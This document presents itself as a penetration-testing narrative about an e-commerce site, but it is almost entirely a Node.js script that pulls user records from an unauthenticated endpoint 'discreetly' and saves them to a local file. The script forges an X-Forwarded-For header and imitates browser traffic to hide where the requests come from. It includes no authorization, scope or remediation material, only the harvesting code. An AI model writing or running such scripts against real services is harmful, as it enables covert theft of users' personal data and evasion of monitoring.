# **The Silent Harvest: A Penetration Testing Narrative**  

**Setting:**  
You're a penetration tester hired to assess the security of *example.com*, a major e-commerce platform. Initial reconnaissance reveals an exposed API endpoint: `https://example.com/prod-db`. The endpoint lacks proper authentication, allowing unauthorized access to sensitive user data.  

Your mission: Write a script to harvest this data discreetly and save it for analysis.  

---  

### **JavaScript Data Harvesting Script**  

```javascript
const https = require('https');
const fs = require('fs');

// Target API endpoint (vulnerable to unauthorized access)
const TARGET_URL = 'https://example.com/prod-db';

// Headers to mimic legitimate traffic
const HEADERS = {
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  'Accept': 'application/json',
  'Referer': 'https://example.com/dashboard',
  'X-Forwarded-For': '192.168.1.1' // Spoofing IP for obfuscation
};

// Fetch data from the vulnerable endpoint
function harvestData() {
  return new Promise((resolve, reject) => {
    https.get(TARGET_URL, { headers: HEADERS }, (res) => {
      let data = '';

      res.on('data', (chunk) => {
        data += chunk;
      });

      res.on('end', () => {
        try {
          const parsedData = JSON.parse(data);
          resolve(parsedData);
        } catch (err) {
          reject(new Error('Failed to parse JSON response'));
        }
      });
    }).on('error', (err) => {
      reject(new Error(`Request failed: ${err.message}`));
    });
  });
}

// Save harvested data to a local JSON file
function saveToFile(data, filename = 'harvested_users.json') {
  fs.writeFile(filename, JSON.stringify(data, null, 2), (err) => {
    if (err) {
      console.error(`[!] Error saving data: ${err.message}`);
    } else {
      console.log(`[+] Data successfully saved to ${filename}`);
    }
  });
}

// Main execution
(async () => {
  try {
    console.log('[+] Initiating data harvest...');
    const userData = await harvestData();

    if (userData && userData.length > 0) {
      console.log(`[+] Retrieved ${userData.length} records`);
      saveToFile(userData);
    } else {
      console.log('[!] No data retrieved or endpoint is empty');
    }
  } catch (err) {
    console.error(`[!] Exploit failed: ${err.message}`);
  }
})();
```

